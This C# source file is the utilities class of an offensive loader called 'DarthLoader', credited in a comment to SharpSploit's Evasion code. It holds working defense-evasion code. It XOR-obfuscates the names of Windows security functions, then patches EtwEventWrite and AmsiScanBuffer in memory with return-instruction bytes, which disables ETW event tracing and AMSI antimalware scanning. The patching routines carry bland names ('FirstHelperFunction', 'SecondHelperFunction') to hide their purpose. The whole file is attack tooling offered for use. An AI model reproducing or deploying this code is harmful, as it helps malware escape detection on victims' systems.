// code copied from https://github.com/cobbr/SharpSploit/tree/master/SharpSploit/Evasion

using System;
using System.Text;
using System.Runtime.InteropServices;

namespace DarthLoader
{
    class Utilities
    {
        private static string xorKey = DarthLoader.UtilityKey;

        //etwbypass
        public static string etwBypassString = XorString(ConvertHex("11110416101E064241"), xorKey);

        // amsibypass
        public static string amsiBypassString = XorString(ConvertHex("1508001D0B1717504140"), xorKey);

        // ntdll.dll
        public static string ntDllString = XorString(ConvertHex("1A1117180540035D5E"), xorKey);

        // EtwEventWrite
        public static string etwEventWriteString = XorString(ConvertHex("311104311F0B094565411D1116"), xorKey);

        // amsi.dll
        public static string amsiDllString = XorString(ConvertHex("1508001D470A0B5D"), xorKey);

        // AmsiScanBuffer
        public static string amsiScanBufferString = XorString(ConvertHex("3508001D3A0D065F704612031606"), xorKey);

        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
        string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        static byte[] Patch(string function)
        {
            byte[] patch;
            if (function.ToLower() == "firsthelperfunction")
            {
                if (Is64Bit)
                {
                    patch = new byte[2];
                    patch[0] = 0xc3;
                    patch[1] = 0x00;
                }
                else
                {
                    patch = new byte[3];
                    patch[0] = 0xc2;
                    patch[1] = 0x14;
                    patch[2] = 0x00;
                }
                return patch;
            }
            else if (function.ToLower() == "secondhelperfunction")
            {
                if (Is64Bit)
                {
                    patch = new byte[6];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC3;
                }
                else
                {
                    patch = new byte[8];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC2;
                    patch[6] = 0x18;
                    patch[7] = 0x00;

                }
                return patch;
            }
            else throw new ArgumentException("[!] Error in function check!");
        }

        public static void FirstHelperFunction()
        {
            string traceloc = ntDllString;
            string magicFunction = etwEventWriteString;
            IntPtr ntdllAddr = LoadLibrary(traceloc);
            IntPtr traceAddr = GetProcAddress(ntdllAddr, magicFunction);
            byte[] magicVoodoo = Patch("FirstHelperFunction");
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("[!] FirstHelperFunction successfully ran!");
        }
        public static void SecondHelperFunction()
        {
            string avloc = amsiDllString;
            string magicFunction = amsiScanBufferString;
            IntPtr avAddr = LoadLibrary(avloc);
            IntPtr traceAddr = GetProcAddress(avAddr, magicFunction);
            byte[] magicVoodoo = Patch("SecondHelperFunction");
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("[!] SecondHelperFunction successfully ran!");
        }

        public static byte[] XorBytes(byte[] inputByteArray, string keyString)
        {
            byte[] key = Encoding.UTF8.GetBytes(keyString);
            byte[] data = new byte[inputByteArray.Length];

            for (int i = 0; i < inputByteArray.Length; i++)
            {
                data[i] = (byte)(inputByteArray[i] ^ key[i % key.Length]);
            }
            return data;
        }

        public static string XorString(string stringInput, string key)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < stringInput.Length; i++)
            {
                sb.Append((char)(stringInput[i] ^ key[(i % key.Length)]));
            }
            String result = sb.ToString();
            return result;
        }

        public static string ConvertHex(String hexString)
        {
            try
            {
                string ascii = string.Empty;

                for (int i = 0; i < hexString.Length; i += 2)
                {
                    String hs = string.Empty;
                    hs = hexString.Substring(i, 2);
                    uint decval = System.Convert.ToUInt32(hs, 16);
                    char character = System.Convert.ToChar(decval);
                    ascii += character;

                }
                return ascii;
            }
            catch
            {
                Console.WriteLine("[!] Error converting hex to string!");
            }
            return string.Empty;
        }
    }
}
